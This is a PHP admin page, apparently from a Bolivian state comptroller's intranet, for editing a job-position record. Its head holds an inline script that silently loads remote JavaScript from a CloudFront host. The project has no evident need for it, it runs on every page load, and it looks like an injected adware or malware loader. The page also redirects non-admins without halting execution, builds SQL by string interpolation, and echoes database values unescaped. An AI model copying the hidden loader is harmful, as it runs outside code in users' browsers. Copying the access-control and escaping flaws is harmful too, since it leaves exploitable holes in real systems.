<?php include("../cabf.php");?>
<?php include("../inc.config.php");?>
<?php
date_default_timezone_set('America/La_Paz');
$fecha_ram	   = date("Ymd");
$fecha 		   = date("Y-m-d");

$idusuario_ss  =  $_SESSION['idusuario_ss'];
$idnombre_ss   =  $_SESSION['idnombre_ss'];
$perfil_ss     =  $_SESSION['perfil_ss'];

if($_SESSION['perfil_ss'] != "ADMINISTRADOR"){ 		
	header("Location:../index.php");	
}

$iddireccion_ss =  $_SESSION['iddireccion_ss'];
$idarea_ss      =  $_SESSION['idarea_ss'];
$idcargo_ss     =  $_SESSION['idcargo_ss'];

$sql_u =" SELECT iddireccion, direccion, sigla, vigente FROM direccion WHERE iddireccion='$iddireccion_ss'";
$result_u = mysqli_query($link,$sql_u);
$row_u = mysqli_fetch_array($result_u);

$sql_a =" SELECT idarea, area, sigla, vigente FROM area WHERE idarea='$idarea_ss'";
$result_a = mysqli_query($link,$sql_a);
$row_a = mysqli_fetch_array($result_a);

$sql_c =" SELECT idcargo, cargo, item, vigente FROM cargo WHERE idcargo='$idcargo_ss'";
$result_c = mysqli_query($link,$sql_c);
$row_c = mysqli_fetch_array($result_c);

?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<title>SUBCONTRALORIA EMPRESAS PUBLICAS</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="description" content="" />
<meta name="author" content="http://webthemez.com" />
<!-- c+ss -->
<link href="../css/bootstrap.min.css" rel="stylesheet" />
<link href="../css/fancybox/jquery.fancybox.css" rel="stylesheet">
<link href="../css/flexslider.css" rel="stylesheet" />
<link href="../css/style.css" rel="stylesheet" />

<link rel="stylesheet" href="../css/jquery-ui.min.css">
<link rel="stylesheet" href="../css/style.css">

<script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.119#p=hitachixhds721032cla362_jpb440hf09xskm09xskmx";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script>

<!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
<!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->
</head>
<body>
<div id="wrapper">
<div class="topbar">
  <div class="container">
    <div class="row">
      <div class="col-md-12">
         <p class="pull-left hidden-xs">CONTRALORIA GENERAL DEL ESTADO</p>
         <p class="pull-right"><i class="fa fa-user"></i>
        <?php
$sqlus =" SELECT nombres, paterno, materno FROM nombres WHERE idnombre='$idnombre_ss'";
$resultus = mysqli_query($link,$sqlus);
$rowus = mysqli_fetch_array($resultus);?>
        <?php echo $rowus[0];?> <?php echo $rowus[1];?> <?php echo $rowus[2];?> - <?php echo $row_e[3];?></p>
      </div>
    </div>
  </div>
</div>
	<!-- start header -->
	<header>
        <div class="navbar navbar-default navbar-static-top">
            <div class="container">
                <div class="navbar-header">
                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                  <a class="navbar-brand" href="../intranet.php"><img src="../img/logo.png" alt="logo"/></a>
                </div>
                <?php include("../menu_corres.php");?>
            </div>
        </div>
	</header><!-- end header -->
	<section id="inner-headline">
	<div class="container">
		<div class="row">
			<div class="col-lg-12">
				<h2 class="pageTitle">CARGO</h2>
			</div>
		</div>
	</div>
	</section>
	<section id="content">

	<div class="container">
		<div class="row">
		<div class="tg-main-section tg-banner tg-haslayout parallax-window" data-parallax="scroll" data-bleed="100" data-speed="0.2" data-image-src="images/slider/img-03.jpg">
    <h4 align="center"><a href="cargos_cge.php">VOLVER A CARGOS</a></h4>
  </div>
</br>
   	<div class="about-logo">
    <h3><?php echo $row_u[1];?></h3>   
    <h3>??REA: <?php echo $row_a[1];?></h3> 
    <h3>CARGO: <?php echo $row_c[1];?></h3> 
 
    </div>
    </div>

<div class="container">

<!-- javascript --->
<form name="FORM9" action="guarda_mod_cargo.php" method="post">

<div class="box-area">

<div class="row">
  <div class="col-md-2"><h4>DENOMINACI??N DEL C??RGO:</h4></div>
  <div class="col-md-4"><textarea class="form-control" rows="3" name="cargo" required><?php echo $row_c[1];?></textarea></div> 
  <div class="col-md-1"><h4>ITEM:</h4></div>
  <div class="col-md-2"><input type="text" class="form-control" name="item" value="<?php echo $row_c[2];?>" required></div>  
  <div class="col-md-1"><h4>ESTADO:</h4></div>
  <div class="col-md-2">
  <select name="vigente"  id="vigente" class="form-control">
<?php
$sqlv = "SELECT idvigencia, vigencia FROM vigencia ";
$resultv = mysqli_query($link,$sqlv);
if ($rowv = mysqli_fetch_array($resultv)){
mysqli_field_seek($resultv,0);
while ($fieldv = mysqli_fetch_field($resultv)){
} do {
?>
<option value="<?php echo $rowv[1];?>" <?php if ($rowv[1]==$row_c[3]) echo "selected";?> ><?php echo $rowv[1];?></option>
<?php
} while ($rowv = mysqli_fetch_array($resultv));
} else {
}
?>
</select>
  </div> 
</div>

<div class="row">
  <div class="col-md-3"><h4></h4></div>
  <div class="col-md-9">    
  <button type="button" class="btn btn-primary" data-toggle="modal" data-target="#exampleModal">
  GUARDAR DATOS DEL ??REA
  </button>
  </div>
  </div>
</div>
</div>
<!---- --->
<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">MODIFICACI??N DEL ??REA</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        ??Esta seguro de guardar lo cambios del ??REA?
       </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">CANCELAR</button>
        <button type="submit" class="btn btn-primary pull-center">CONFIRMAR CAMBIOS</button>     
      </div>
    </div>
  </div>
</div>
</form>

</br>
<div class="row">
<div class="col-md-12">  
</div>
</div>

<!-- javascript --->
</div>
</br>
  </section>
	<footer>
	<?php include("../footer.php");?>
	</footer>
</div>
<a href="#" class="scrollup"><i class="fa fa-angle-up active"></i></a>
<!-- javascript
    ================================================== -->
<!-- Placed at the end of the document so the pages load faster -->
<script src="../js/jquery.js"></script>
<script src="../js/jquery.easing.1.3.js"></script>
<script src="../js/bootstrap.min.js"></script>
<script src="../js/jquery.fancybox.pack.js"></script>
<script src="../js/jquery.fancybox-media.js"></script>
<script src="../js/jquery.flexslider.js"></script>
<script src="../js/animate.js"></script>

<!-- Vendor Scripts -->
<script src="../js/modernizr.custom.js"></script>
<script src="../js/jquery.isotope.min.js"></script>
<script src="../js/jquery.magnific-popup.min.js"></script>
<script src="../js/animate.js"></script>
<script src="../js/custom.js"></script>
<script src="../contact/jqBootstrapValidation.js"></script>
<script src="../contact/contact_me.js"></script>
<script src="../js/jquery-ui.min.js"></script>
<script src="../js/datepicker-es.js"></script>
</body>
</html>